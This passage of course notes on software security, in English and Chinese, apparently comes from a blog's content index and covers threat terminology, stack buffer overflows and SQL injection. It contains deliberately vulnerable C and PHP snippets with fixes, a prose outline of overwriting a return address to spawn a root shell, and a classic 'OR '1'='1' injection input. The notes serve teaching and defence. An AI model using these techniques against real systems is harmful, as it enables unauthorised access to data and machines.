information<br>\nLow: faculty directory information</li>\n<li>Integrity<br>\nHigh: patient allergy information<br>\nModerate: web site like online forums<br>\nLow: anonymous online poll</li>\n<li>Availability<br>\nHigh: authentication services<br>\nModerate: public web site for a university<br>\nLow: online telephone directory lookup application</li>\n</ul>\n<ol start=\"5\">\n<li>Computer Security Terminology</li>\n</ol>\n<ul>\n<li><strong>Adversary</strong> (threat agent) is an entity that attacks, or is a threat to, a system</li>\n<li><strong>Attack</strong> is an assault on system security that derives from an intelligent threat; that is, an intelligent act that is a deliberate attempt (especially in the sense of a method or technique) to evade security services and violate the security policy of a system</li>\n<li><strong>Countermeasure</strong> is an action, device, procedure, or technique that reduces a threat, a vulnerability, or an attack by eliminating or preventing it, by minimising the harm it can cause, or by discovering and reporting it so that corrective action can be taken</li>\n<li><strong>Risk</strong> is an expectation of loss expressed as the probability that a particular threat will exploit a particular vulnerability with a particular harmful result</li>\n<li><strong>Security Policy</strong> is the set of rules and practices that specify or regulate how a system or organisation provides security services to protect sensitive and critical system resources</li>\n<li><strong>System Resource (Asset)</strong> is the data contained in an information system; or a service provided by a system; or a system capability, such as processing power or communication bandwidth; or an item of system equipment; or a facility that houses system operations and equipment</li>\n<li><strong>Threat</strong> is a potential for violation of security, which exists when there is a circumstance, capability, action, or event, that could breach security and cause harm</li>\n<li><strong>Vulnerability</strong> is a flaw or weakness in a system’s design, implementation, or operation and management that could be exploited to violate the system’s security policy</li>\n</ul>\n<h1 id=\"Threats and Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Threats and Attacks\">#</a> Threats and Attacks</h1>\n<ol>\n<li>Assets</li>\n</ol>\n<ul>\n<li><strong>Hardware</strong> includes computer systems and other data processing, data storage, and data communications devices</li>\n<li><strong>Software</strong> includes the operating system, system utilities, and applications</li>\n<li><strong>Data</strong> includes files and databases, as well as security-related data, such as password files</li>\n<li><strong>Network</strong> includes communication facilities such as local and wide area network communication links, bridges, routers, and so on</li>\n</ul>\n<ol start=\"2\">\n<li>Vulnerabilities</li>\n</ol>\n<ul>\n<li>It can be corrupted, so that it does the wrong thing or gives wrong answers (Integrity)\n<ul>\n<li>E.g. stored data values may differ from what they should be because they have been improperly modified</li>\n</ul>\n</li>\n<li>It can become leaky (Confidentiality)\n<ul>\n<li>E.g. someone who should not have access to some or all of the information available through the network obtains such access</li>\n</ul>\n</li>\n<li>It can become unavailable or very slow (Availability)\n<ul>\n<li>E.g. using the system or network becomes impossible or impractical.</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Threats<br>\nAn attack is a threat that is carried out and leads to threat consequence</li>\n</ol>\n<ul>\n<li>Types of attacks\n<ul>\n<li><strong>Active attack</strong> attempts to alter system resources or affect their operation<br>\n 示例：篡改数据、破坏系统功能、删除文件、拒绝服务攻击（DoS）等。<br>\n影响：直接对系统资源进行修改或破坏，导致系统功能受损。</li>\n<li><strong>Passive attack</strong> attempts to learn or make use of information from the system that does not affect system resources. Passive attacks are very difficult to detect because they do not involve any alteration of the data<br>\n 示例：流量分析、数据包嗅探、解密通信等。<br>\n影响：攻击者不会修改系统或数据，但可能会获得敏感信息或通信内容。</li>\n</ul>\n</li>\n<li>Origin of attacks\n<ul>\n<li><strong>Inside attack</strong> is initiated by an entity inside the security perimeter</li>\n<li><strong>Outside attack</strong> is initiated from outside the perimeter</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Threat Consequences</li>\n</ol>\n<ul>\n<li>Attacks that Cause Unauthorised Disclosure<br>\n<strong>Unauthorised disclosure</strong> is a circumstance or event whereby an entity gains<br>\naccess to data for which the entity is not authorised\n<ol>\n<li>信息暴露（Exposure）<br>\n定义：当内部人员故意或无意间将敏感信息（如信用卡号）泄露给外部人员时，就会发生信息暴露。<br>\n示例：社交网站意外将用户的保密信息发布在网页上。<br>\n解释：信息暴露可以是由于人为错误或系统配置不当导致的，常见于数据泄露事件。</li>\n<li>拦截（Interception）<br>\n定义：这是基于网络的攻击，黑客通过网络监听获取电子邮件流量和其他数据传输内容。<br>\n示例：数据包嗅探、网络流量窃听等。<br>\n解释：拦截攻击通常通过网络中的中间人攻击（MITM）、不安全的无线连接或其他网络漏洞来实现。</li>\n<li>推理（Inference）<br>\n定义：当攻击者通过观察网络流量模式或数据库访问模式而获得信息时，就会发生推理攻击。<br>\n示例：流量分析可以通过检测流量的模式、时间或数量来推断信息的类型或内容。<br>\n解释：推理攻击并不需要实际访问敏感信息，而是通过分析元数据或行为模式推测出信息。</li>\n<li>入侵（Intrusion）<br>\n定义：当攻击者绕过系统的访问控制保护，获取对敏感数据的未经授权访问时，就会发生入侵。<br>\n示例：通过漏洞利用、暴力破解或获取凭证绕过身份验证。<br>\n解释：入侵攻击通常是通过直接破坏系统防线来访问或窃取敏感信息的。</li>\n</ol>\n</li>\n<li>Attacks that Cause Deception<br>\nDeception is circumstance or event that may result in an authorised entity receiving false data and believing it to be true\n<ol>\n<li>伪装（Masquerade）<br>\n定义：伪装是指未经授权的用户通过冒充授权用户来试图访问系统。<br>\n解释：伪装攻击破坏了系统的身份验证机制，使得攻击者能够以合法用户的身份进行操作。<br>\n示例：\n<ul>\n<li>未授权用户获取他人的 ID 和密码后冒充合法用户。</li>\n<li>恶意软件伪装成授权应用程序，获得对系统的未经授权的访问。</li>\n</ul>\n</li>\n<li>篡改（Falsification）<br>\n定义：篡改是指对有效数据进行更改或替换，或将虚假数据引入文件或数据库中。<br>\n解释：篡改攻击涉及数据的非法修改，破坏了系统的 完整性（Integrity），导致数据不准确或不可靠。<br>\n示例：\n<ul>\n<li>学生在学校数据库中修改自己的成绩。</li>\n<li>黑客更改金融交易记录或替换数据库中的敏感信息。</li>\n</ul>\n</li>\n<li>否认（Repudiation）<br>\n定义：否认是指用户否认发送或接收数据的行为。<br>\n解释：否认攻击涉及通信或交易的不可否认性，影响了系统的可靠性和信任性。这种攻击通常需要通过数字签名、日志记录和不可否认性协议进行防御。<br>\n示例：\n<ul>\n<li>用户声称没有发送某封电子邮件。</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>Attacks that Cause Disruption<br>\nDisruption is a circumstance or event that interrupts or prevents the correct operation of system services and functions\n<ol>\n<li>瘫痪（Incapacitation）<br>\n定义：瘫痪是一种针对系统可用性的攻击，其目的是通过物理破坏或恶意软件导致系统硬件或服务失效。<br>\n解释：攻击者通过直接损坏硬件或利用恶意代码使系统关键组件无法工作，导致系统无法为用户提供正常的服务。这类攻击破坏了系统的 可用性（Availability）。<br>\n示例：特洛伊木马、病毒或蠕虫导致关键服务失效，或使得系统硬件崩溃，阻止合法用户的正常访问。</li>\n<li>破坏（Corruption）<br>\n定义：破坏是指通过恶意软件改变系统资源或服务的正常行为，从而使系统在非预期情况下运行。<br>\n解释：攻击者通过篡改系统的数据、配置或功能，使得系统的行为不再可靠或准确。这种攻击影响了系统的 完整性（Integrity），导致数据不可信或系统功能受损。<br>\n示例：黑客植入后门程序，使得系统提供了未授权的访问，或篡改了数据库中的关键数据，导致应用程序的行为异常。</li>\n<li>阻塞（Obstruction）<br>\n定义：阻塞是一种干扰通信的攻击，通过禁用通信链路或篡改通信控制信息来影响系统的正常通信。<br>\n解释：攻击者通过发送大量垃圾数据或篡改通信协议，使系统的网络或处理能力过载，从而影响合法用户的通信。这种攻击破坏了系统的 可用性（Availability） 和通信的有效性。<br>\n示例：攻击者通过分布式拒绝服务攻击（DDoS）让网络流量超载，导致正常的通信被阻塞或延迟。</li>\n</ol>\n</li>\n<li>Attacks that Cause Usurpation<br>\nUsurpation is a circumstance or event that results in control of system services or functions by an unauthorised entity\n<ol>\n<li>挪用（Misappropriation）<br>\n定义：挪用是指攻击者未经授权使用或盗用系统资源或服务。<br>\n解释：攻击者通过获取未授权的访问权限，利用系统的资源或服务，可能包括网络带宽、计算能力等。这种攻击对系统的 可用性（Availability） 和资源的公平分配构成威胁。<br>\n示例：分布式拒绝服务（DDoS）攻击使得网络资源被耗尽，导致合法用户无法正常使用服务。</li>\n<li>滥用（Misuse）<br>\n定义：滥用是指通过恶意逻辑或黑客手段，使系统被用于非授权的目的或偏离其正常用途。<br>\n解释：攻击者可能通过植入恶意软件或获得未授权的系统访问，禁用或绕过安全功能，使系统无法保护其资源和数据的安全。这种攻击影响系统的 完整性（Integrity） 和 可用性（Availability）。<br>\n示例：黑客绕过安全控制措施，使得防火墙规则被禁用，从而使系统易受进一步的攻击。</li>\n</ol>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Threats and Assets</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>Asset</th>\n<th>Availability</th>\n<th>Confidentiality</th>\n<th>Integrity</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Hardware</td>\n<td>Equipment is stolen or disabled, thus denying service</td>\n<td>An unencrypted HDD or CD/DVD is stolen</td>\n<td></td>\n</tr>\n<tr>\n<td>Software</td>\n<td>Programs are deleted, denying access to users</td>\n<td>An unauthorised copy of software is made</td>\n<td>A working program is modified, either to cause it to fail during execution or to cause it to do some unintended task</td>\n</tr>\n<tr>\n<td>Data</td>\n<td>Files are deleted, denying access to users</td>\n<td>An unauthorised read of data is performed. An analysis of statistical data reveals underlying data</td>\n<td>Existing files are modified or new files are fabricated</td>\n</tr>\n<tr>\n<td>Network</td>\n<td>Messages are destroyed or deleted. Communication lines or networks are rendered unavailable</td>\n<td>Messages are read. The traffic pattern of messages is observed</td>\n<td>Messages are modified, delayed, reordered, or duplicated. False messages are fabricated</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"6\">\n<li>Attack Surfaces\n<ol>\n<li>网络攻击面 (Network Attack Surface)<br>\n 定义：网络攻击面是指企业网络、广域网或互联网中的各种漏洞，这些漏洞可能被攻击者利用。<br>\n解释：攻击者可能通过网络层的漏洞，如服务中断、通信链路破坏等，来发起攻击。<br>\n示例：\n<ul>\n<li>拒绝服务攻击 (DoS)：攻击者利用大量无效请求占用服务器资源，导致合法用户无法访问服务。</li>\n<li>通信链路中断：通过物理或网络手段破坏通信链路，从而阻止或干扰数据传输。<br>\n入侵攻击：未经授权的用户通过网络漏洞进入系统，获取或修改敏感信息。</li>\n</ul>\n</li>\n<li>软件攻击面 (Software Attack Surface)<br>\n 定义：软件攻击面是指应用程序或操作系统代码中的漏洞。<br>\n解释：此类漏洞可能存在于程序代码中，被攻击者利用来执行未授权的操作或获取系统权限。<br>\n示例：\n<ul>\n<li>Web 服务器软件漏洞：攻击者通过注入恶意代码、SQL 注入或缓冲区溢出来获取服务器控制权或访问敏感信息。</li>\n</ul>\n</li>\n<li>人类攻击面 (Human Attack Surface)<br>\n 定义：人类攻击面是指由于人员或外部人员的行为所造成的漏洞。<br>\n解释：攻击者可以通过社会工程、人为错误或信任的内部人员来攻击系统。<br>\n示例：\n<ul>\n<li>社会工程：攻击者通过伪装身份或操纵用户情感来骗取敏感信息。</li>\n<li>人为错误：员工在处理信息时的失误可能会导致数据泄露或系统损坏。</li>\n<li>信任的内部人员：有访问权限的员工或合作伙伴可能会恶意使用他们的权限来获取未授权的数据。</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>Security Implementation</li>\n</ol>\n<ul>\n<li>Prevention: it is an ideal security scheme is one in which no attack is successful. Although not practical in all cases, there are threats in which prevention is a reasonable goal</li>\n<li>Detection: if absolute protection is not feasible, it may be practical to detect security attacks</li>\n<li>Response: if an ongoing attack is detected, the system can respond to halt the attack and prevent further damage</li>\n<li>Recovery: if data integrity is compromised, a prior, correct copy of the data can be reloaded</li>\n</ul>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security"]},{"title":"Stack buffer overflow","url":"/course/Stack-buffer-overflow/","content":"<h1 id=\"Stack buffer overflow\" class=\"active\"><a class=\"anchor\"  href=\"#Stack buffer overflow\">#</a>Stack buffer overflow</h1>\n<ol>\n<li>The Process Stack</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>Sample Process C Code</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">A</span><span class=\"params\">(<span class=\"type\">int</span> a, <span class=\"type\">int</span> b, <span class=\"type\">int</span> c)</span>  </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">\t<span class=\"type\">char</span> buffer1[<span class=\"number\">5</span>]; </span><br><span class=\"line\">\t<span class=\"type\">char</span> buffer2[<span class=\"number\">10</span>]; </span><br><span class=\"line\">    \t... </span><br><span class=\"line\"> &#125; </span><br><span class=\"line\"> <span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>  </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">\tA(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>); </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(...); </span><br><span class=\"line\">   \t ... </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/26/671ca1b71cfbb.png\" alt=\"img\"></p>\n<p>在调用函数时，函数参数是按照从右到左的顺序依次压入栈中。这种参数传递方式是 x86 架构的标准做法，用于保证函数参数在栈上的正确顺序。<br>\n在这个例子中，函数  <code>A(int a, int b, int c)</code>  被调用时， <code>c</code>  首先被压入栈，然后是  <code>b</code> ，最后是  <code>a</code> 。</p>\n<ol start=\"2\">\n<li>Buffer Overflow</li>\n</ol>\n<ul>\n<li>Occurs when:<br>\nInput is unconstrained<br>\nRuns past the end of a buffer, replacing valid (control) data</li>\n<li>Technique that allows:<br>\nYour code to be executed by another program<br>\nOverflow data area to alter variable values</li>\n<li>Problem: declaration in version of login.c is  <code>char name[80], passwd[80], hash[13];</code> . Attack login procedure:\n<ol>\n<li>User types username, which is stored in name</li>\n<li>Compute hash for the corresponding password</li>\n<li>User types password, pads to 80 chars, and types hash for that password</li>\n<li>The program validates password against user-supplied hash; user is in (with any password)</li>\n</ol>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Stack Smashing<br>\n 缓冲区溢出攻击的核心是覆盖栈上的 返回地址（ret）。当返回地址被覆盖时，程序在函数返回时不会跳回调用函数的位置，而是跳转到攻击者指定的位置。攻击者可以利用这种技术让程序执行任意代码（如恶意代码或 shellcode），这被称为堆栈破坏。</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>Stack Smashing</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">functionA</span><span class=\"params\">(<span class=\"type\">char</span> *str)</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"type\">char</span> buffer[<span class=\"number\">16</span>]; </span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(buffer, str);   <span class=\"comment\">//segmentation fault</span></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"type\">char</span> large_string[<span class=\"number\">256</span>]; </span><br><span class=\"line\">\t<span class=\"type\">int</span> i; </span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">255</span>; i++) </span><br><span class=\"line\">       &#123; </span><br><span class=\"line\">\t\tlarge_string[i] = <span class=\"string\">&#x27;A&#x27;</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">\tfunctionA(large_string); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>buffer</code> ：在  <code>functionA</code>  中声明为 16 字节的字符数组。</li>\n<li><code>strcpy(buffer, str)</code> ：使用  <code>strcpy</code>  将外部传入的字符串 str 复制到 buffer 中。由于  <code>strcpy</code>  不检查长度，如果  <code>str</code>  的长度超过 16 字节，会导致缓冲区溢出。</li>\n<li>在  <code>main</code>  中， <code>large_string</code>  是一个 256 字节的数组，它被填充为 255 个 ‘A’。当  <code>large_string</code>  被传递给  <code>functionA</code>  时， <code>buffer</code>  被溢出。</li>\n<li>修复：  <code>strcpy(buffer, str)</code>  --&gt;  <code>strncpy(buffer, str, 16);</code></li>\n</ul>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/26/671ca87ccb1e2.png\" alt=\"img\"><br>\n <code>large_str</code>  has overflowed  <code>buffer</code>  and  <code>sfp</code>  and  <code>ret</code>  and  <code>*str</code> .Note that  <code>ret</code>  is the return address!<br>\nThis means we can get the function to return to any point in the code that we specify.</p>\n<ul>\n<li>Buffer overflows allow us to change return address\n<ol>\n<li>Can point to any function in the library</li>\n<li>Can point to own code</li>\n</ol>\n</li>\n<li>Add code in the overflowed buffer\n<ol>\n<li>Run at privilege of process (very useful if root!)</li>\n<li>Even a small buffer can invoke a shell using the system call (often called shellcode)</li>\n</ol>\n</li>\n<li>Attacker would like to run shell at root level\n<ol>\n<li>Make system call to  <code>execve</code> , passing  <code>/bin/sh</code></li>\n<li>Needs to be part of the buffer, and in assembly code (以便精确控制其大小和功能)</li>\n<li>Program has to fit in buffer without overwriting return address (如果 shellcode 覆盖了返回地址本身，可能导致程序崩溃而无法执行攻击代码)</li>\n<li>Pad out buffer to return address, and point return address to start of buffer</li>\n<li>Don’t generate core dump (this will cause suspicion)</li>\n</ol>\n</li>\n</ul>\n<ol start=\"4\">\n<li>What do You Need to Hack a Buffer Overflow\n<ol>\n<li>Address where buffer begins</li>\n</ol>\n<ul>\n<li>Easy to get if you have access to the same type of system being attacked</li>\n<li>Can use Null Operation (NOP) commands to make the target address bigger</li>\n</ul>\n<ol start=\"2\">\n<li>Location where return address is stored</li>\n</ol>\n<ul>\n<li>Can pad out the buffer with return address</li>\n</ul>\n<ol start=\"3\">\n<li>Assembly language program to spawn a shell (shellcode payload)</li>\n</ol>\n<ul>\n<li>Can use gdb to disassemble a program for you</li>\n</ul>\n</li>\n<li>Affected Languages</li>\n</ol>\n<p>Buffer overflows mainly occur in low-level programming languages that allow direct memory access: Assembler, C, C++<br>\nNote that some high-level languages such as Java, C# and Visual Basic are written in C, C++ or call modules written in these languages</p>\n<ol start=\"6\">\n<li>\n<p>Buffer Overflow Examples<br>\nFunctions that handle arrays but do not check length (checking for termination character is insufficient) In C/C++,   <code>gets</code> ,  <code>strcpy</code> ,  <code>strcat</code> ,  <code>sprintf</code></p>\n<ol>\n<li>Example 1</li>\n</ol>\n</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> buf[<span class=\"number\">20</span>]; </span><br><span class=\"line\"> gets(buf);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p><code>char buf[20]</code> ：定义了一个长度为 20 的字符数组  <code>buf</code> 。</p>\n</li>\n<li>\n<p><code>gets(buf)</code> ：使用  <code>gets()</code>  函数从标准输入读取字符串，并存储在  <code>buf</code>  中</p>\n</li>\n<li>\n<p><code>gets()</code>  函数不检查输入的长度，意味着如果输入的字符串长度超过了  <code>buf</code>  的大小（20 字节），则会发生缓冲区溢出。</p>\n</li>\n<li>\n<p>修复：  <code>fgets(buf, sizeof(buf), stdin);</code></p>\n<ol start=\"2\">\n<li>Example 2</li>\n</ol>\n</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> buf[<span class=\"number\">20</span>]; </span><br><span class=\"line\"> <span class=\"type\">char</span> prefix[] = <span class=\"string\">&quot;http://&quot;</span>; </span><br><span class=\"line\">   ... </span><br><span class=\"line\">   <span class=\"comment\">// copies the string prefix to buf </span></span><br><span class=\"line\"> <span class=\"built_in\">strcpy</span>(buf, prefix); </span><br><span class=\"line\">   <span class=\"comment\">// concatenates path to the string buf </span></span><br><span class=\"line\"> <span class=\"built_in\">strncat</span>(buf, path, <span class=\"keyword\">sizeof</span>(buf));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p><code>char buf[20]</code> ：定义了一个长度为 20 字节的字符数组  <code>buf</code> 。</p>\n</li>\n<li>\n<p><code>char prefix[] = &quot;http://&quot;;</code> ：定义了一个包含字符串  <code>&quot;http://&quot;</code>  的字符数组。</p>\n</li>\n<li>\n<p><code>strcpy(buf, prefix)</code> ：将字符串  <code>&quot;http://&quot;</code>  复制到  <code>buf</code>  中。</p>\n<ul>\n<li>问题： <code>&quot;http://&quot;</code>  长度为 7 字节（包括终止符 \\0），在复制后， <code>buf</code>  中只剩下 13 个字节可用。</li>\n</ul>\n</li>\n<li>\n<p><code>strncat(buf, path, sizeof(buf))</code> ：将字符串  <code>path</code>  连接到  <code>buf</code>  中，指定的最大长度为  <code>sizeof(buf)</code> （即 20 字节）。</p>\n<ul>\n<li>问题：这里的  <code>sizeof(buf)</code>  是 20 字节，但在前面已经用掉了 7 字节（包括终止符）。 <code>strncat()</code>  试图追加  <code>path</code>  的内容时，可能会超出  <code>buf</code>  的剩余空间（13 字节），导致缓冲区溢出。</li>\n</ul>\n</li>\n<li>\n<p>修复： <code>strncat(buf, path, sizeof(buf) - strlen(buf) - 1);</code></p>\n<ol start=\"3\">\n<li>Example 3</li>\n</ol>\n</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> buf[<span class=\"number\">32</span>]; </span><br><span class=\"line\"> <span class=\"built_in\">strncpy</span>(buf, data, <span class=\"built_in\">strlen</span>(data)); </span><br></pre></td></tr></table></figure>\n<p><code>strncpy(buf, data, strlen(data))</code> ：将字符串  <code>data</code>  复制到  <code>buf</code>  中，复制的长度为  <code>strlen(data)</code> 。</p>\n<ul>\n<li>\n<p>缺陷 1：缺少终止符 \\0： <code>strncpy</code>  不会自动添加字符串的终止符  <code>\\0</code> ，如果  <code>data</code>  的长度等于或大于 32，那么  <code>buf</code>  不会以  <code>\\0</code>  结尾。这可能导致  <code>buf</code>  被当作未终止的字符串处理，带来不确定的行为或安全风险。</p>\n</li>\n<li>\n<p>缺陷 2：可能的缓冲区溢出：如果  <code>strlen(data) &gt; 32</code> ， <code>strncpy</code>  将尝试复制超过  <code>buf</code>  大小的内容，导致缓冲区溢出。</p>\n</li>\n<li>\n<p>修复： <code>strncpy(buf, data, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\\0';</code></p>\n<ol start=\"4\">\n<li>Example 4</li>\n</ol>\n</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> buf[MAX_PATH]; </span><br><span class=\"line\"> <span class=\"built_in\">sprintf</span>(buf, <span class=\"string\">&quot;%s - %d\\n&quot;</span>, path, errno);</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>sprintf(buf, &quot;%s - %d\\n&quot;, path, errno)</code>  会将  <code>path</code>  和  <code>errno</code>  的格式化字符串复制到  <code>buf</code>  中。</li>\n<li><code>sprintf</code>  不检查  <code>buf</code>  的大小是否足以容纳格式化后的结果。如果  <code>path</code>  很长，加上数字  <code>errno</code>  和其他字符，可能会超过  <code>MAX_PATH</code> ，导致缓冲区溢出。</li>\n<li>修复：  <code>snprintf(buf, sizeof(buf), &quot;%s - %d\\n&quot;, path, errno);</code></li>\n</ul>\n<h1 id=\"Stack buffer overflow prevention\" class=\"active\"><a class=\"anchor\"  href=\"#Stack buffer overflow prevention\">#</a>Stack buffer overflow prevention</h1>\n<ol>\n<li>Spotting Buffer Overflows</li>\n</ol>\n<ul>\n<li>Check inputs, whether read from the network, a file, or from the command line</li>\n<li>Check transfer of data from said input to internal structures</li>\n<li>Look for use of unsafe string handling calls</li>\n<li>Look for use of arithmetic to calculate an allocation size or remaining buffer size</li>\n</ul>\n<ol start=\"2\">\n<li>Fixing Buffer Overflows</li>\n</ol>\n<ul>\n<li>Replace dangerous string handling functions</li>\n<li>Replace C string buffers with C++ strings</li>\n<li>Replace static arrays with STL containers</li>\n<li>Use analysis tools, Examples include Fortify, Coverity, PREfast, and Klocwor</li>\n</ul>\n<ol start=\"3\">\n<li>Code Analysis</li>\n</ol>\n<ul>\n<li>Statically check source to detect buffer overflows s</li>\n<li>Several tools exist to automate the review process<br>\nStanford:  Engler, et al.  Test trust inconsistency<br>\n@stake.com  (<span class=\"exturl\" data-url=\"aHR0cDovL2wwcGh0LmNvbQ==\">l0pht.com</span>): SLINT (designed for UNIX)<br>\nBerkeley:  Wagner, et al.  Test constraint violations</li>\n<li>Find lots of bugs, but not all</li>\n</ul>\n<ol start=\"4\">\n<li>Marking Stack as Non-Execute<br>\nBasic stack exploit can be prevented by marking stack segment as non-executable<br>\nLimitations and Problems</li>\n</ol>\n<ul>\n<li>Some apps need executable stack (e.g. LISP interpreters)</li>\n<li>Does not block more general overflow exploits</li>\n<li>Overflow on heap: overflow buffer next to func pointer</li>\n<li>Cannot make all the data segment non-executable</li>\n<li>More recent UNIX and MS windows emit dynamic code into program data for performance optimisations</li>\n</ul>\n<ol start=\"5\">\n<li>Stack Protection and Run-time Checking<br>\nMany run-time checking techniques\n<ol>\n<li>Example:  StackGuard (WireX)</li>\n</ol>\n<ul>\n<li>Run time tests for stack integrity</li>\n<li>Code generator for emitting code to set up and tear down functions</li>\n<li>Embeds “canaries” in stack frames and verify their integrity prior to function return</li>\n</ul>\n<ol start=\"2\">\n<li>Libsafe (Avaya Labs)</li>\n</ol>\n<ul>\n<li>Dynamically loaded library</li>\n<li>Intercepts calls to  <code>strcpy (dest, src)</code>\n<ul>\n<li>Validate sufficient space in current stack frame: |framepointer–dest| &gt; strlen(src)</li>\n<li>If so, does strcpy. Otherwise, terminates application</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Address obfuscation (Stony Brook’03)</li>\n</ol>\n<ul>\n<li>Encrypt return address on stack by XORing with random string. Decrypt just before returning from function</li>\n<li>Attacker needs decryption key to set return address to desired value</li>\n</ul>\n<ol start=\"7\">\n<li>PaX ASLR: Randomise location of libc</li>\n</ol>\n<ul>\n<li>Attacker cannot jump directly to exec function</li>\n</ul>\n","categories":["课程笔记","Principles of Software Security"],"tags":["C","software security","vulnerability"]},{"title":"SQL Injection","url":"/course/SQL-Injection/","content":"<h1 id=\"SQL Injection\" class=\"active\"><a class=\"anchor\"  href=\"#SQL Injection\">#</a>SQL Injection</h1>\n<ul>\n<li>Exploit vulnerabilities in input validation to run arbitrary commands in the database\n<ul>\n<li>Using user input to construct dynamic SQL statements to access the database</li>\n<li>Using stored procedures that are passed strings that contain unfiltered user input</li>\n</ul>\n</li>\n<li>Attacker can execute arbitrary commands in the database\n<ul>\n<li>Worse if the application uses a privileged account to connect to the database</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$selecteduser</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>];  </span><br><span class=\"line\"> <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT Username, Key FROM Key &quot;</span> .  </span><br><span class=\"line\">        <span class=\"string\">&quot;WHERE Username=&#x27;<span class=\"subst\">$selecteduser</span>&#x27;&quot;</span>; </span><br><span class=\"line\"> <span class=\"variable\">$rs</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">executeQuery</span>(<span class=\"variable\">$sql</span>); </span><br></pre></td></tr></table></figure>\n<p>在上述代码中， <code>$selecteduser</code>  是从用户输入中直接获取的，它被无过滤地插入到 SQL 查询中。由于没有对  <code>$selecteduser</code>  进行任何过滤或转义，攻击者可以在输入中添加恶意的 SQL 语句，改变原始查询的含义。假设攻击者提供以下输入作为 user 参数：</p>\n<figure class=\"highlight bash\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">admin<span class=\"string\">&#x27; OR &#x27;</span>1<span class=\"string\">&#x27;=&#x27;</span>1 </span><br></pre></td></tr></table></figure>\n<p>这将导致查询变成：</p>\n<figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> Username, Key <span class=\"keyword\">FROM</span> Key <span class=\"keyword\">WHERE</span> Username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span> <span class=\"keyword\">OR</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>在这种情况下， <code>OR '1'='1'</code>  永远为真，这意味着数据库将返回所有用户的信息，而不仅仅是  <code>admin</code>  用户的信息</p>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/30/6721ec7cbba70.png\" alt=\"img\"></p>\n<h1 id=\"Example\" class=\"active\"><a class=\"anchor\"  href=\"#Example\">#</a>Example</h1>\n<p>SQL Injections Can be Used to …</p>\n<ol>\n<li>Login<br>\nSQL 注入 是一种通过操控用户输入，使之直接嵌入 SQL 查询，从而改变查询逻辑的攻击方式。攻击者可以利用这种方式获取未经授权的数据库访问，甚至获取敏感数据</li>\n</ol>\n<figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> userFound<span class=\"operator\">=</span><span class=\"keyword\">execute</span>( </span><br><span class=\"line\">   &quot;SELECT * FROM USERS WHERE </span><br><span class=\"line\">    username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;&quot;); </span><br></pre></td></tr></table></figure>\n<p>To authenticate logins, server runs this SQL command against the user database</p>\n<figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span 